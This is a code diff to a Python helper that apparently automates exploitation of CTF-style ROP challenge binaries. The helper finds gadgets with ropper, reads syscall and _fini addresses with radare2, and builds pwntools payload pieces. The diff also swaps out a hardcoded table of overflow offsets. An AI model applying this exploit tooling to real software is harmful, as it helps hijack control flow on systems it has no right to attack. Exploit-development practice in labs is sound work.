@@ -3,7 +3,7 @@ import json
 import r2pipe
 import logging
 import subprocess
-import angr, angrop, claripy
+import angr, claripy
 from pwn import *
 
 logging.disable(logging.CRITICAL)
@@ -12,6 +12,7 @@ class our_rop:
     # use quing system, must use bigger pops first
     # put in check to avoid overwrighting previous stems
     def __init__(s, analyze):
+        s.analyze = analyze
         cmd = 'ropper --nocolor -f ' + analyze.binary + ' 2>/dev/null | grep 0x'
         raw_gadgets = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
         
@@ -47,10 +48,16 @@ class our_rop:
     def get_syscall(s):
         for i in s.gadgets:
             if 'syscall' in i:
-                return int(i.split(':')[0], 16)
+                return p64(int(i.split(':')[0], 16))
+    def realighn(s):
+        return p64(s.analyze.get_fini())
+
+
         return None
     def satisfy_win(s):
-        return s.fill_reg('rdi', analyze.get_win_arg())
+        arg = s.fill_reg('rdi', s.analyze.get_win_arg())
+        print(arg)
+        return arg
 
         
 
@@ -160,6 +167,9 @@ class analyze:
             return s.function_addrs['sym.execve']
         except:
             return None
+    def get_fini(s):
+        return s.function_addrs['sym._fini']
+
     
     def get_win_arg(s):
         val = s.r2.cmd('pdf @ sym.win | grep cmp | awk \'{print $NF}\'')
@@ -174,24 +184,13 @@ class analyze:
         except:
             return True
 
-class get2overflow:
+class fmat:
     def __init__(s, binary):
-        s.binary = binary[6:]
-        s.cheat = {'bin-ret2execve-1': 88,
-                   'bin-ret2execve-12': 88,
-                   'bin-ret2one-15': 200,
-                   'bin-ret2one-4': 136,
-                   'bin-ret2syscall-13': 184,
-                   'bin-ret2syscall-2': 216,
-                   'bin-ret2system-14': 136,
-                   'bin-ret2system-3': 88,
-                   'bin-ret2win-0': 184,
-                   'bin-ret2win-11': 152}
-    def buf(s):
-        return s.cheat[s.binary]
+        elf = ELF(binary)
+    def flag_on_stack():
+        return False
 
 
-'''
 class get2overflow:
     def __init__(s, binary):
         s.elf = context.binary =  ELF(binary)
@@ -232,4 +231,3 @@ class get2overflow:
             return len(s.symbolic_padding)
         except:
             return 0
-'''
